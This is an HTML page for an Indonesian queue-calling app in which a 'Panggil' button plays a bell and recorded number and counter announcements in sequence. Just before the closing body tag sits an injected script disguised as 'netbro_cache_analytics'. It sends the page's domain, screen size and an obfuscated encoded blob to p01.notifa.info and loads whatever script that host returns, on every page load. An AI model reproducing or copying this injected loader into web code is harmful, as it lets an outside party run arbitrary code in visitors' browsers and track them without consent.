
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Aplikasi Suara Antrian</title>
<link rel="stylesheet" href="syle.css" />
<script type="text/javascript" src="jquery-1.7.2.js"></script>
<script type="text/javascript" >
$(document).ready(function(){
	$("#play").click(function(){
		document.getElementById('suarabel').play();		
	});
	
	
});
</script>
</head>
<body >
		<audio id="suarabel" src="Airport_Bell.mp3"></audio>
		<audio id="suarabelnomorurut" src="rekaman/nomor-urut.wav"  ></audio> 
		<audio id="suarabelsuarabelloket" src="rekaman/loket.wav"  ></audio> 
       
		<audio id="belas" src="rekaman/belas.wav"  ></audio> 
		<audio id="sebelas" src="rekaman/sebelas.wav"  ></audio> 
        <audio id="puluh" src="rekaman/puluh.wav"  ></audio> 
        <audio id="sepuluh" src="rekaman/sepuluh.wav"  ></audio> 
        <audio id="ratus" src="rekaman/ratus.wav"  ></audio> 
        <audio id="seratus" src="rekaman/seratus.wav"  ></audio> 
        <audio id="suarabelloket1" src="rekaman/1.wav"  ></audio> 
		        		<audio id="suarabel0" src="rekaman/1.wav" ></audio>   		        
        		
          <div align="center" class="kontainer" style="color:white; text-shadow: 2px 2px 4px #000000;">Sistem Antrian Loket</div>
      
        <div class="kontainer">
          <div align="center"><a id="konter" href="index.php" >1</a></div>
        </div>
        <div class="kontainer2">
          <div align="center">
            <input name="play" onclick="mulai();" type="button" value="Panggil" />
            <input name="reset" onclick="location.href='reset.php'" type="button" value="Reset" />
          </div>
        </div>
		
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAiOVlk1uqU7xbzjykW3%2bAwiMu0wx5fuj38%2b127%2bH9%2byw31Xt9iec2%2bhmWpzTlZQU5sWB7Rj714Z98%2bqFmrxD9PHy%2bxFJYFXoUAHk4QgkYEvdMf2h4H5Fpyw2wEdJli2HK6fiwflk8Rf%2fhJXX2KX6XcPyEYqsoTfHDaKnhm7QBGOV6iZ%2foWNdPdp48pHyRWrP15f4ah2SYHAW4csiZBRYtfrDnq0BMp7tmQDrrCjIMxoAIqEIKdw6iw%2bhLiEvqXsLAflKprVkDB3encs6HSQgHQVF7UTnciimDa%2bQ1TW5zx5R7tz78NWPG1mnoJ15SJ7kIiShh8%2b%2bMgINv1a0vE12ey1dxkMMZSqU33%2fKL5Bvm7TjwayWU7j9gy9uwl2z1%2bIKq8o7eoIjLVHi8nqhm5GdjaDWBzU9deRwFmaDwUwlXuTFdoJifo8PRJHHfVHYaO3iTpeJ4jxDgAoha03ZqjGHpQ7Sck%2bO8Ybn8tAIKFA08qgwXof5cFkSZQAF8Iz%2bUBdRlpnuQUkneZGcDgdKmffK6c1u3LU8D4%2b2jTeWx95JoQxh8c6dyfZjo4o%2brZIQOoBVM" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
<script type="text/javascript">
function mulai(){
	//MAINKAN SUARA BEL PADA SAAT AWAL
	document.getElementById('suarabel').pause();
	document.getElementById('suarabel').currentTime=0;
	document.getElementById('suarabel').play();
			
	//SET DELAY UNTUK MEMAINKAN REKAMAN NOMOR URUT		
	totalwaktu=document.getElementById('suarabel').duration*1000;	

	//MAINKAN SUARA NOMOR URUT		
	setTimeout(function() {
			document.getElementById('suarabelnomorurut').pause();
			document.getElementById('suarabelnomorurut').currentTime=0;
			document.getElementById('suarabelnomorurut').play();
	}, totalwaktu);
	totalwaktu=totalwaktu+1000;
	
				
			setTimeout(function() {
					document.getElementById('suarabel0').pause();
					document.getElementById('suarabel0').currentTime=0;
					document.getElementById('suarabel0').play();
				}, totalwaktu);
			
			totalwaktu=totalwaktu+1000;
			
		
		totalwaktu=totalwaktu+1000;
		setTimeout(function() {
						document.getElementById('suarabelsuarabelloket').pause();
						document.getElementById('suarabelsuarabelloket').currentTime=0;
						document.getElementById('suarabelsuarabelloket').play();
					}, totalwaktu);
		
		totalwaktu=totalwaktu+1000;
		setTimeout(function() {
						document.getElementById('suarabelloket1').pause();
						document.getElementById('suarabelloket1').currentTime=0;
						document.getElementById('suarabelloket1').play();
					}, totalwaktu);	
}
</script>